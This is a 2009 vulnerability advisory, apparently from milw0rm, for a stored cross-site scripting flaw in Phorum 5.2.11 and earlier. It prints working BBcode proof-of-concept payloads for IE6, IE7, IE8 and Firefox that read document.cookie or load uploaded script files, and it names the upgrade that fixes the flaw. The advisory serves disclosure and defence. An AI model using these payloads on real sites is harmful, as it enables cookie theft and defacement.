@@ -1,0 +1,89 @@
+//----- Advisory
+
+Program          : Phorum 5.2.11 and prior
+Homepage         : http://www.phorum.org/
+Discovery        : 2009/07/16
+Author Contacted : 2009/07/17
+Found by         : CrashFr
+This Advisory    : CrashFr
+
+//----- Application description
+
+
+Started in 1998, Phorum was the original PHP and MySQL based Open Source
+forum software. Phorum's developers pride themselves on creating message
+board software that is designed to meet different needs of different web
+sites while not sacrificing performance or features.
+
+
+//----- Description of vulnerability
+
+
+Phorum's filtering engine insufficiently filters some BBcode arguments.
+Using the bbcode tags [color] and [size] it is possible to execute Javascript
+using expression CSS property.
+
+
+//----- Proof Of Concept
+
+
+When the user post the following bbcode :
+
+[color=#000000;xss:expression(alert(document.cookie));]Sysdream Testing XSS[/color]
+or
+[size=20px;xss:expression(alert(document.cookie));]Sysdream Testing XSS[/size]
+
+The application convert it into the follow HTML code :
+
+<span style="color:#000000;xss:expression(alert(document.cookie));">Sysdream Testing XSS</span>
+and
+<span style="font-size: 20px;xss:expression(alert(document.cookie));">Sysdream Testing XSS</span>
+
+For IE6 you can use this POC:
+
+[color=#000000;background-image:url(javascript:alert('Sysdream_IE6_Alert'));]Sysdream 
+Testing IE6[/color]
+
+For IE7:
+[color=#000000;xss:expression(alert('Sysdream_IE7_Alert'));]Sysdream Testing 
+XSS[/color]
+
+Obviously, the POC doesn't work in IE8 and Firefox.
+
+But, but , but...
+Uploading htc (for IE8) or xml (for FF) file on the phorum using the "My 
+Files" function in "Control Center", you can use :
+
+POC for FF:
+[color=#000000;-moz-binding:url(http://127.0.0.1/phorum/file.php?0,file=9,filename=script.xml#mycode);]Sysdream 
+Testing FF[/color]
+
+POC for IE8:
+[color=#000000;behavior:url(http://127.0.0.1/phorum/file.php?0,file=8,filename=script.htc);]Sysdream
+Testing FF[/color]
+
+//----- Impact
+
+
+This vulnerability can be used to modify the phorum display, to gather the victim's cookie, etc.
+
+
+//----- Solution
+
+Upgrade Phorum to 5.2.12
+
+
+//----- Credits
+
+
+http://www.sysdream.com
+http://www.hackerzvoice.net
+
+crashfr at sysdream dot com
+
+
+//----- Greetings
+
+Virtualabs
+
+# milw0rm.com [2009-07-22]
